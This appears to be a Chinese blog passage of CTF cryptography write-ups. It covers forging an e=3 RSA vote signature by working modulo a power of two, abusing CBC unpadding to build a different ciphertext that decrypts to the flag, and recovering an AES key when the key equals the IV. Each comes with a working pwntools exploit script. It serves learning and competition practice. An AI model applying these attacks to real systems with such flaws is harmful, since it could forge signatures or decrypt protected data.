<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = <span class="number">11441834613624826172418663634046279113882505385891956376343615067285261133850481718598387372799863015467637880949144273419549065969128475439028853349338539694499051803136413392677937180372746004434886408226683060356000756320682607488203211095719491230534679239863637181733978031967798145219807433667347849650017657700970435971961705992349692203870546936934197834532861409558927204969349851725967348387731892180785297131580108320422093208933302332371110292195085685318752738251192012489360801049345566481979567998761296129083101798420484839100061738554182863915465349499485814533228278687226339268848069597015443528832</span></span><br><span class="line">c2 = <span class="built_in">int</span>(iroot(m, <span class="number">3</span>)[<span class="number">0</span>]) + <span class="number">0x10001</span></span><br><span class="line">c4 = c2 ** <span class="number">2</span></span><br><span class="line">c8 = c2 ** <span class="number">3</span></span><br><span class="line">m2 = <span class="string">b&#x27;:&#x27;</span>.join([<span class="string">b&#x27;Z\xa3\x04\x9a\xf5Co\x84xu?\xf4\xda\xd9%;\x81\xa6\x85=\x80Fp&lt;\xf5\x01M2\x16\x15\xe0\xc5\xc3\xa4\x04\xc1\xe1\xc8)\xe6\xa0\xdeDX&amp;\x90\xad\x00\x89a%C\xdek\xed\xde\xc8&#123;\xf0\x7fW&#x27;</span>, <span class="string">b&quot;\xc8t\x81\xaaQ\xd5/D\xa0r]\x16\x8b\xbf=b\x19\x11\xf2V\xf0\xd7&gt;\x8b\xa1=T0\x92\x15?\xbdR&#123;\x0b\x91\xfbF\xf5H\xd7 [\xf9\xd1E\x12B3\xcf\x04VE\x9a\xa6K&lt;\xc2-\x1b&gt;V\xa8\x19\xfa\xf9\x8a\xc5_o\xf0)u\xb4\x92l\x1al=\xe9\n\x00C\x7f\x06\xd4\xf9\xfc\xeaX\x901\xceZ\xde\xcc 7\xb2j\x86-i\xbc|\x81\xf0\x08\r\x03\x16\x0c\x8aN\x18\xc90\xfc\xd8\x87\x07&#125;A&#x27;D[\xa9\xb9\xb1\x11$N&#123;\x10\x05\xab\x0e\x86~\xff\rT\xe3\xd7%\xb4\x8d6\x95\x9a\x96;\xc4h~\xe3\xbab\xecC\x9b\xf11&#x27;c\xfc&amp;\xe3\x11\x850\xe5\xaf\t\xf1\x83\x83\x15M\x84=\x92\x8c\xda\xb9\xd7\xb2\x1e\x05\x9c\x1b\xb7\x06\xe8&quot;</span>])</span><br><span class="line">m4 = <span class="string">b&#x27;:&#x27;</span>.join([<span class="string">b&quot;eW\xd5\xbd\x08w\x0c\xc9I\xac\x17\xecE\xcb\xda\xfd^;\xa4\xf7\xa6\xf3\x04PE/A\xe5qK\xe9JOm\xee\xd1h\xf7o\xa8\x1c\xa0\x068\xb3\xf1\xe7\x7f-\x9f\x19\xb4j\xa3\x90\x07\x1c\xb7\x12z\xad9A\xb9\xa7\xee\x8eBI\xd0]0\t\x9a\x08]\xbb\x1a\xca\x137&#125;G\xc1\xfa\x14\xd1\t\xad\x1d\x1e\xa1\xb4\x88\x1a\x8d\xd3\x8a\xbcU\x86\x00Im\x05\xaaVJ(\xa9\x04rS\x00\x19\x02\x18\x8a\xa0g4\xcdg!9\xf5\x98z\xcc\x9b\x84\xd5&gt;x\x13\xe2\xcd&#x27;1\x8b3a\xe6\x93\xd3\xa4\x06\xe0\xe9\x1aO\xa9\xb5\xe7@\xe8\x9atv\x8d\xf8_rK\xf2u\xf1\x04\x7f\xb45\xdf\x0f\x87\x97V\x15\xcc\xda\xd3\x8c\x8b\xd2V\x1e\x1d\xbd\xd1&#x27;\xca\xaa\xec\x1c\xee\xed\xe0\r6\xd7\xd3\x93;\x1e@Z\xaf6\xc4\xae\xe0\xe3\xbf\x85\xfd\x8f\x0b\xd9\xce^`\xbc\xc8\x7f\xfbQ\xd7\xae\xc8\x9bL\x02^\xcf\xbd\xcc\xa4D\xb7\x9f\xf9\x0c\xd5\xe9\xda\xa1\x03\x9d\xed0\x9aY\x85d$(&#125;&quot;</span>])</span><br><span class="line">m8 = <span class="string">b&#x27;:&#x27;</span>.join([<span class="string">b&#x27;\x0fB\xc18\x04\x9c)\xbe\xf7J\xcc\xe2\x88\xd4\x12\xa7FwL\xa6\xc9\xf3\xaeRVV\xb6\xaeo\xd8\xc2h\xedo\xc7\xae\xd3\xf9\xab\xd6\xc43\x932\xf9\xff\xc9\xf6S\xd5\x9c\xba]f\xb6M\xde\x07\x9dx\xaaX6\xb5\x0fz\xf7\xc2\x0fY8\x81l\x14\x87\x91\x1c&amp;\x1a\xce\xc30\xc4\xdd\xe2&quot;V&amp;(J\x9eD3S*O\t\x07A\xabZ\xdd&gt;\xc0`\xc0d\xa3\xa7\xb4\xaa\xb5Tf\xae\x88\x8ex(\xf0\xaco0j\xdd\xc5\x13\xda\x86[\xee#\x18s\xe5\xfd\xb8 \xffP4\xd1\xc3\xd9\xe6\x18%\x1a\x13\x0ey+VQVb&#125;&#123;\xa5\xe1A\xa2y!Tu\xe2O\xf649\xa5u?\xbb\x02\xe4\x95z\xfef\x9c\x92E\x15\xadM\t\x98\x8dj\xd9\xd9wU\x93#;\xb6\xa2\x08\xe73\xcf\xf7;\xc7/\xc9\x0e\xa3\xf6\x18\xd2\xe8\xd7\xac\&#x27;\x07\xe6c\xc5\xedEhvf\xcdO\x11\xaf\xac^Y(&#123;\x19!\x81_h\x9c\x15\xfb\xbd\x0f\x89\xe8\xc6U0MM\xe0\x89&#125;&#x27;</span>])</span><br><span class="line">m1, m2, m3 = bytes_to_long(m2), bytes_to_long(m4), bytes_to_long(m8)</span><br><span class="line">n = gcd(m1 ** <span class="number">2</span> - m2, m1 ** <span class="number">3</span> - m3)</span><br><span class="line"><span class="comment"># n = 12998510197135204376024977476677066247754836878539929011686148268745119316209020562579171398886840449113325708748228673135311752569187260449619807807903218621065777199171595498055285073001556241300819299111213719824569275786074961700296240844459968460491714678805615009589712788617029938309306389913328704049259197596077475679388746327337019377724684383107233046619031888347065776485290701116620689771500575467431146354734895248116917853679826521686058032549240850391628465710220654255931003952332899029099575800979554751748212159051355321567757716972030886957773638513566062484273620681928826749865617412173047445893</span></span><br></pre></td></tr></table></figure>

<p>比赛结束环境就关了，所以在本地复现下，<em>9月以后所有的附件可以在github上找到</em></p>
<p>想要交互还是挺麻烦的，这里就当于已经得到n了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="number">15160582676846215658796665511167073968034171296661551317484064414530852799771618235942954787122243854880075538411956180191332121712749102940834469106520160911820689656980924928940857041289182520881995375555391429116695091017132599877027688472814801911156488488572658968858514549082874942198209100374290699361245526127362315158765216477920262317888955067180876826737792124089711465313919322691350383089478781115531028327464978498168550501234908278822070734957259085100730831106569924227163225782388696667537281068625312828784413432273812618076026392105724267064367773254829708738371876092746215522784893719413972288863</span></span><br><span class="line">n = <span class="number">15746945526432122479214630433270149949898055696087559742180830690847507891453515116075588796192340169435734319815395381666689989899222866782097160453565424738446970488798269177137604678808633207375125945542218010260891606865601540037996424336907526029576270546861238099120672228457910383070027371579273232850527367464802499941689387144111902397279853997069146494099457026354542952331566285341348508821513652475468126522170376081188733013126170230888215340038166274999418672245444957134175669183047604867371997408007732297783287752312442659031828940988055885376811763957465614461850705292428963651655262273479037747317</span></span><br><span class="line">e = <span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>已知enc，要用d签名一个以b’:Biden!’结尾的字节流并send过去，用e验证</p>
<p>也就是要使<br>$$<br>m=c^e\ mod\ n<br>$$<br>m在转字节流之后结尾是<code>:Biden!</code>，显然这是RSA验证的过程，我们只要用d生成某个以<code>:Biden!</code>结尾的字节流的密文<br>$$<br>c=m^{d}\ mod\ n<br>$$<br>但是n无法分解，也就是说求不出d，那唯一的攻击点只有已知末尾是<code>:Biden!</code></p>
<p>但从稍微结合实际一点的角度出发，这个加密系统是为了投票而设立的，想知道最后一部分是什么，就是想知道票投给了谁了，加上用d来签名，是为了验证这是谁投的票，莫名其妙就遇到了老师上《安全协议与标准》的投票情景。所以，这么看的话，这个加密系统是没有漏洞的，除非n是特殊的，但是目前ctf的常用手段并没有更加明朗的指向，只能按下不表了，希望到时候有WP</p>
<hr>
<p><em>好家伙，有地方省赛出到这道题了，我。。<del>（原来没有出的题目是可以重复利用的）</del></em></p>
<p><em>期间很多人私聊我这道题，唔，可是我太菜了，始终不会，对不起各位师傅</em></p>
<p><em>但是在众师傅的协力下，有师傅在评论区留下他的解法，更新一下</em></p>
<p>有种发现新大陆的感觉</p>
<p>其实不知道n也是完全可以的，我这样搞出n反而把自己带偏</p>
<p>关键是构造一个在模2的倍数（且和3互素）的几次幂下的RSA签名，因为n是足够大的，完全可以构造使得三次方验证的时候，计算结果是小于模数的，也就是不用考虑n；但问题是模这样一个数为什么可以保留最低位</p>
<p>想了几天没想明白，有机会再问问别的师傅，先收了</p>
<p>初步理解是$c^3$低位就是f，因为在模$2^x$下，会保留低x位，这个比较容易懂；所以在$c^3$又是在RSA中的验证环节，得到的m，由于f是先d次方得到的c，在这个RSA签名验证的环节，低x位是成立的，所以m的低x位就是f。这应该是模$2^x$次方的性质（但好像模$14^x$也可以，不懂了）</p>
<p>完整的exp，贴</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># :20</span></span><br><span class="line">sh = remote(<span class="string">&#x27;47.96.253.167&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"><span class="comment"># sh = process([&quot;python&quot;, &quot;server.py&quot;])</span></span><br><span class="line">payload1 = sh.recvuntil(<span class="string">b&#x27;Your vote:&#x27;</span>).decode()</span><br><span class="line">payload1 = findall(<span class="string">r&quot;\d+&quot;</span>, payload1)[<span class="number">0</span>]</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;]\n&#x27;</span>)</span><br><span class="line">flag1 = sh.recvline()[:-<span class="number">1</span>]</span><br><span class="line">sh.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 20:</span></span><br><span class="line">sh = remote(<span class="string">&#x27;47.96.253.167&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">f = bytes_to_long(<span class="string">b&#x27;:Biden!&#x27;</span>)</span><br><span class="line">N = <span class="number">2</span> ** <span class="number">47</span></span><br><span class="line">phiN = <span class="number">2</span> ** <span class="number">46</span></span><br><span class="line">d = invert(e, phiN)</span><br><span class="line">c = <span class="built_in">pow</span>(f, d, N)</span><br><span class="line">payload2 = <span class="built_in">str</span>(c)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;]\n&#x27;</span>)</span><br><span class="line">flag2 = sh.recvline()[:-<span class="number">1</span>]</span><br><span class="line">sh.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag1 + flag2)</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211005133747776.png" alt="image-20211005133747776"></p>
<p>当然flag是假的</p>
<h2 id="Yusa的密码学课堂—CBC第二课（recuring）"><a href="#Yusa的密码学课堂—CBC第二课（recuring）" class="headerlink" title="Yusa的密码学课堂—CBC第二课（recuring）"></a>Yusa的密码学课堂—CBC第二课（recuring）</h2><p>这道题感觉似曾相识，但是一直执着于三个CBC分块，一下午脑子都绕晕，尚师傅二十分钟就出了；做题太少，感觉不够，不敢跳出去</p>
<p><em>如果你觉得勤奋在天赋面前不值一提，那说明你不够努力</em></p>
<p>来看主要代码逻辑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = os.urandom(<span class="number">16</span>)</span><br><span class="line">        iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">        cipher = _enc(flag, key, iv).<span class="built_in">hex</span>()</span><br><span class="line">        <span class="built_in">print</span>(cipher)</span><br><span class="line">        paintext = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&quot;Amazing function: &quot;</span>))</span><br><span class="line">        <span class="built_in">print</span>(enc(paintext, key).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">        backdoor = <span class="built_in">input</span>(<span class="string">&quot;Another amazing function: &quot;</span>)</span><br><span class="line">        <span class="keyword">assert</span> backdoor != cipher</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> dec(<span class="built_in">bytes</span>.fromhex(backdoor), key, iv) == flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Wow, amazing results.&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(e))</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>

<p>先加密flag，然后给我们一个自己定IV和Plaintext的机会，进行加密，最后我们输入密文，提供一个解密的机会，如果这个解密的结果等于flag，但是我们输入的密文不能是flag加密后的密文，那么就输出flag</p>
<p>乍一听，不可能啊，一个不是flag加密得到的密文，进行解密也可以得到flag？？？</p>
<p>所以这道题就有其特殊性，这里有一个pad和unpad函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">data</span>):</span></span><br><span class="line">    pad_len = BLOCKSIZE - (<span class="built_in">len</span>(data) % BLOCKSIZE) <span class="keyword">if</span> <span class="built_in">len</span>(data) % BLOCKSIZE != <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> pad_len == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">return</span> data + <span class="built_in">chr</span>(pad_len) * pad_len</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpad</span>(<span class="params">data</span>):</span></span><br><span class="line">    num = <span class="built_in">ord</span>(data[-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> data[:-num]</span><br></pre></td></tr></table></figure>

<p>这里unpad是关键，会根据最后一位将加上的pad给去掉；一般来说是没有问题的，但是如果有不怀好意的人（尚师傅上）刻意构造假的pad，那么情况就不一样了（所以很好奇Crypto库里的unpad函数是怎么实现的呢）</p>
<p>关于CBC基本流程可以看<a href="https://blog.csdn.net/m0_49109277/article/details/119841141?spm=1001.2014.3001.5501">Macaw_Revenge</a>，而这道题尚师傅说可以从<a href="https://blog.csdn.net/m0_49109277/article/details/119841141?spm=1001.2014.3001.5501">Xoro</a>获得提示</p>
<p>借一下上次的图</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/AES_CBC.png" alt="AES_CBC"></p>
<p>直接说做法了，可以看出，无论我们在这三块中如何闹腾，都不可能整出一个解密是flag却又不是flag对应的密文</p>
<p>所以我们不妨手动加上一块，密文块2作为IV，而明文块3我们让最后其最后一位是<code>16+flag的填充位数</code>转字节；这样就可以在加密的过程中，完全可以把这一块和前面三块并在一起，相当于加密<code>flag+我们自己的填充</code>，而解密出来在unpad的时候，由于unpad的机制，就把所有的pad，包括flag本身的，以及我们添加的pad全部去掉了，得到的就是flag，但是密文不同</p>
<p>因为环境关了，在本地复现的，报一些奇怪的错，最后想要的已经求出来send过去了，但是在unpad的时候有问题；虽然原脚本是py2的，但是运行这个老是因为各种换行的IO错误，最后还是改了下unpad这个函数，加了第一句转字符串的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210908210437443.png" alt="image-20210908210437443"></p>
<p>这样下面这个脚本在本地就可以打通了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">sh = process([<span class="string">&quot;python3&quot;</span>, <span class="string">&quot;./server_py3.py&quot;</span>])</span><br><span class="line">cipher = <span class="built_in">bytes</span>.fromhex(sh.recvline()[:-<span class="number">1</span>].decode())</span><br><span class="line">c0, c1, c2 = cipher[:<span class="number">16</span>], cipher[<span class="number">16</span>:<span class="number">32</span>], cipher[<span class="number">32</span>:]</span><br><span class="line"><span class="comment"># len(cipher) == 48</span></span><br><span class="line"><span class="comment"># our plaintext</span></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Amazing function:&#x27;</span>)</span><br><span class="line">pad = <span class="built_in">chr</span>(<span class="number">8</span>+<span class="number">16</span>).encode() * <span class="number">16</span></span><br><span class="line">sh.sendline(pad.<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment"># our iv</span></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Your iv: &#x27;</span>)</span><br><span class="line">sh.sendline(c2.<span class="built_in">hex</span>())</span><br><span class="line">cx = <span class="built_in">bytes</span>.fromhex(sh.recvline()[:-<span class="number">1</span>].decode())</span><br><span class="line"><span class="comment"># our backdoor</span></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Another amazing function: &#x27;</span>)</span><br><span class="line">backdoor = cipher + cx</span><br><span class="line">sh.sendline(backdoor.<span class="built_in">hex</span>())</span><br><span class="line">flag = sh.recvline().decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>flag是我自己uuid的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210908210552799.png" alt="image-20210908210552799"></p>
<p>因为看原附件中<code>DASCTF&#123;*********&#125;</code>总长度是40，所以上面才这么果断设置了pad为<code>chr(8+16).encode()*16</code>；如果不是的话，可以从一开始的密文知道，48长，也就是分三段，flag至少33长，稍微爆破下也可以出来的</p>
<h2 id="Yusa的密码学课堂—CBC第三课（recuring）"><a href="#Yusa的密码学课堂—CBC第三课（recuring）" class="headerlink" title="Yusa的密码学课堂—CBC第三课（recuring）"></a>Yusa的密码学课堂—CBC第三课（recuring）</h2><p>这道题就把pad给改掉了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">data</span>):</span></span><br><span class="line">	pad_len = BLOCKSIZE - (<span class="built_in">len</span>(data) % BLOCKSIZE) <span class="keyword">if</span>  <span class="built_in">len</span>(data) % BLOCKSIZE != <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">	<span class="keyword">return</span> data + <span class="string">&quot;=&quot;</span> * pad_len</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpad</span>(<span class="params">data</span>):</span></span><br><span class="line">	<span class="keyword">return</span> data.replace(<span class="string">&quot;=&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>来看主逻辑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task</span>():</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		key = os.urandom(<span class="number">16</span>)</span><br><span class="line">		asuy = enc(flag,key)</span><br><span class="line">		<span class="built_in">print</span> asuy.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">		paintext = raw_input(<span class="string">&quot;Amazing function(in hex): &quot;</span>)</span><br><span class="line">		paintext = paintext.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">		<span class="built_in">print</span> enc(paintext,key).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">		asuy = raw_input(<span class="string">&quot;Another amazing function(in hex): &quot;</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">		yusa = dec(asuy,key)</span><br><span class="line"></span><br><span class="line">		flag_l = s_2_l(flag)</span><br><span class="line">		yusa_l = s_2_l(yusa)</span><br><span class="line">		<span class="keyword">for</span> each <span class="keyword">in</span> yusa_l:</span><br><span class="line">			<span class="keyword">if</span> each <span class="keyword">in</span> flag_l:</span><br><span class="line">				<span class="built_in">print</span>(<span class="string">r&quot;You&#x27;re not yusa!&quot;</span>)</span><br><span class="line">				exit()</span><br><span class="line">		<span class="built_in">print</span> yusa.encode(<span class="string">&#x27;hex&#x27;</span>)		</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="built_in">print</span> <span class="built_in">str</span>(e)</span><br><span class="line">		exit()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	task()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先对flag进行加密，IV和KEY是相同的</p>
<p>然后是一个加密，可以由我们自己指定的明文的，而且IV和KEY也是之前的IV和KEY</p>
<p>最后是一个解密，同样也是IV和KEY</p>
<hr>
<p>为什么会有人KEY=IV？为什么我还不知道漏洞？</p>
<p>最后一步，没有直接给flag，如果通过了for循环，那么可以得到你自己输入的密文的明文，但是如果没有通过，说明你指定的密文得到的明文有flag的一部分，emmmmm那还是没通过的好。不过不通过的话，又得不到解密的结果，还是白给。但是如果通过了，说明我们是已经知道flag的内容，并且加以一定的方式将其绕过，也就没有再输出明文的必要。。。事情开始向不好的方向发展</p>
<p>结合我们已经有flag的密文，可以搞点事情</p>
<p><strong>所以总结一下，到此为止，联系上一道题，这里就是给你flag的密文，但是又提供你解密的机会，但是要求解密出来的东西里面十六块一部分的十六块一部分的不和flag中的不完全相同（绕过判定机制），但是你知道怎么从这个解密结果里面看出flag；至于如何构造？大概率就是利用中间的那个已知明文，相同key的加密</strong></p>
<p>显然</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210909082357017.png" alt="image-20210909082357017"></p>
<p>如果是第二题，我们利用这种方法也可以得到，可以得到与flag对应的密文不同的密文；但这道题不行，因为它是判断明文之间的比较。有什么办法将一些pad插入到明文0~2中吗</p>
<p><em>最烦的就是，KEY和IV一样真的没有利用点吗</em></p>
<p><em>想了一个晚上还有第二天的网络安全课，课上也糟糟的，不知道说什么好，以为出不来又要作罢了。可是尚师傅花了一节python课的时间就弄明白这是怎么一回事了</em></p>
<p><em>此刻我已经找不到足以表达我崇拜之情的表情包了.jpg</em></p>
<hr>
<p>下面开始整活，确实，攻击点不在我上面一直在纠结的博弈上。由于KEY和IV一样，这就可以提供我们很大的便利，这也算是这个系统的漏洞吧。最后一层解密不应该看做得到flag的直接途径，而是看成一次解密的机会更好</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/cbc.jpg" alt="cbc"></p>
<p>图上说的很清楚，左边是flag的加密过程，右边是我们借助已有的条件进行攻击的过程。主要的思路就是，因为KEY=IV，又分别有一次加密和解密，那为什么不直接把IV和KEY搞出来呢</p>
<p>在我们自由控制明文的那里，我们输入两块全是<code>\x00</code>的字节流，为的是消除明文对加密过程产生不可干预的影响，这样整个加密流程，除了KEY一切就变得透明起来</p>
<p>做完一次加密，我们得到了两密文，再加上我们还剩下一次解密的机会，如果你和尚师傅一样聪明，就可以想到把刚才的加密的流程给拆开，其中一半用解密函数来完全道破，另一半也就不攻自破</p>
<p>正如图上所画将<code>c4</code>送过去解密，得到<code>回显</code>；显然<code>回显^key</code>就是<code>c4</code>通过加密之前的<code>c3</code></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210909131814443.png" alt="image-20210909131814443"></p>
<p>即<code>回显 ^ key = c3</code>，那么<code>c3</code>已知，<code>key = c3 ^ 回显</code>，就此我们得到key，后面再现aes解密就好了</p>
<p>完整的本地exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpad</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="string">b&quot;=&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = process([<span class="string">&quot;python3&quot;</span>, <span class="string">&quot;./server_py3.py&quot;</span>])</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(sh.recvline()[:-<span class="number">1</span>].decode())</span><br><span class="line"></span><br><span class="line">cipher = <span class="built_in">bytes</span>.fromhex(sh.recvline()[:-<span class="number">1</span>].decode())</span><br><span class="line">c1, c2, c3 = cipher[:<span class="number">16</span>], cipher[<span class="number">16</span>:<span class="number">32</span>], cipher[<span class="number">32</span>:<span class="number">48</span>]</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Amazing function(in hex): &#x27;</span>)</span><br><span class="line">plaintext = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">32</span></span><br><span class="line">sh.sendline(plaintext.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">cx = <span class="built_in">bytes</span>.fromhex(sh.recvline()[:-<span class="number">1</span>].decode())</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Another amazing function(in hex): &#x27;</span>)</span><br><span class="line">yusa = cx[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">sh.sendline(yusa.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">asuy = <span class="built_in">bytes</span>.fromhex(sh.recvline()[:-<span class="number">1</span>].decode())</span><br><span class="line">keyx = xor(asuy[:<span class="number">32</span>], cx[:<span class="number">16</span>])</span><br><span class="line"><span class="keyword">assert</span> key == keyx</span><br><span class="line">aes = AES.new(keyx, AES.MODE_CBC, keyx)</span><br><span class="line"><span class="built_in">print</span>(unpad(aes.decrypt(cipher)).decode())</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210909132014232.png" alt="image-20210909132014232"></p>
<p>可以打通</p>
<p>当然和第二题一样，pad和unpad函数也做过一丢丢的修改，不知道这个修改伤不伤大雅</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">data</span>):</span></span><br><span class="line">    pad_len = BLOCKSIZE - (<span class="built_in">len</span>(data) % BLOCKSIZE) <span class="keyword">if</span> <span class="built_in">len</span>(data) % BLOCKSIZE != <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> pad_len == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">return</span> data + <span class="string">&quot;=&quot;</span> * pad_len</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpad</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> data.replace(<span class="string">b&quot;=&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>我觉得非常不好，好吃懒做，脑子不灵光，注意力不集中，转牛角尖，死咬一道题不放（WM也），导致今天效率很慢</p>
<p>如果天赋不够，那就用勤奋来弥补吧</p>
<p>总结一下可以发现，今天的题目并不难（bushi第一题还没想出来），想不到就是想不到，想到了就是走一遍流程的问题，有很多小细节和平时的积累有关；然后在今天的做这些题目的过程中，我也尝试经历了出题，测试的环节，感觉确实很多讲究，现在还是本地了，如果放到服务器上，打在端口上，对出题人的要求更大；在此向所有合格的出题人表示敬意和感谢</p>
<p>我也会继续前进的，不择手段地前进——Thomas Wade</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210917 SharkCTFCrypto方向部分WP</title>
    <url>/posts/69ac5a99/</url>
    <content><![CDATA[<p>W&amp;M密码师傅亲自出题</p>
<p>比赛应该结束了吧，有新题但是没来得及看</p>
<span id="more"></span>

<h1 id="SharkCTF"><a href="#SharkCTF" class="headerlink" title="SharkCTF"></a>SharkCTF</h1><h2 id="Cryptography指北"><a href="#Cryptography指北" class="headerlink" title="Cryptography指北"></a>Cryptography指北</h2><p>给了pdf，一个对CTF-Crypto方向的介绍以及一些经验之谈，看到wishper师傅博客上的话</p>
<h2 id="Classic-Crypto-king"><a href="#Classic-Crypto-king" class="headerlink" title="Classic_Crypto_king"></a>Classic_Crypto_king</h2><blockquote>
<p>FunexPGS{pn3F4e!_PN3fnE1_PnrFne!}</p>
</blockquote>
